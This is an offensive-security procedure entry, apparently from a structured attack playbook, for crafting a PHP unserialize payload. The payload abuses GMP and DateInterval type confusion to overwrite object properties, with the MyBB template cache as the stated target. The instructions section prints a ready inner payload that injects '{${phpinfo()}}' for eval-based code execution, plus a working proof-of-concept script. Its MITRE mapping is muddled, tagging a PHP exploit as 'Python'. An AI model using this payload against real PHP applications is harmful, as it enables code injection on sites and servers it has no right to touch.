---
id: proc-gmp-payload-001
tags:
  - deserialization
  - payload-craft
  - php
  - gmp
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/arbitrary-property-update-exploit]]'
verified: false
platforms:
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
updated_at: '2025-12-14T17:23:54.829Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
---
# Craft-GMP-Payload-for-Object-Property-Manipulation

## Summary

This procedure crafts a serialized PHP payload using a GMP object with an inner DateInterval to exploit type confusion, allowing arbitrary updates to existing object properties like the templates cache in MyBB.

## Description

The payload wraps an inner serialized structure in a GMP object, using DateInterval's __wakeup to cast the GMP to an integer ZVAL (handle 5 for templates). This enables zend_hash_copy to update properties such as setting the 'index' template cache to '{${phpinfo()}}', leading to code injection during eval in template parsing. Tested on PHP 5.6 < 5.6.30.

## Requirements

1. PHP environment with GMP extension
2. Knowledge of serialized PHP format
3. Target object handle (e.g., 5 for MyBB templates)

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all serialized inputs
- Disable GMP extension if unused
- Use object proxies or safe unserializers

## Objectives

1. Create payload for type confusion exploitation
2. Demonstrate property manipulation on stdClass or templates
3. Prepare for injection into application input

## Instructions

### Step 1: Build Inner Payload Structure

**Context**: Define the inner serialized data for property updates, including reference to alter ZVAL type.

Manually construct: s:1:"5";a:2:{s:5:"cache";a:1:{s:5:"index";s:14:"{${phpinfo()}}";}i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}

> This sets cache.index to injectable code and uses DateInterval reference.

### Step 2: Wrap in GMP and Test

**Context**: Serialize as GMP object and unserialize to verify manipulation.

Execute [[commands/arbitrary-property-update-exploit]]:

```php
<?php $obj = new stdClass; $obj->aa = 1; $obj->bb = 2; $inner = 's:1:"1";a:3:{s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:{s:4:"ryat";R:2;}}'; $exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}'; $x = unserialize($exploit); var_dump($obj); ?>
```

> Expected output: Modified stdClass with 'aa' and 'bb' as 'hi', confirming update.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Python]]

### Sub-Techniques


## Commands Used

- [[commands/arbitrary-property-update-exploit]]

## Tools Used


## Tags

- deserialization
- payload-craft
- php
- gmp
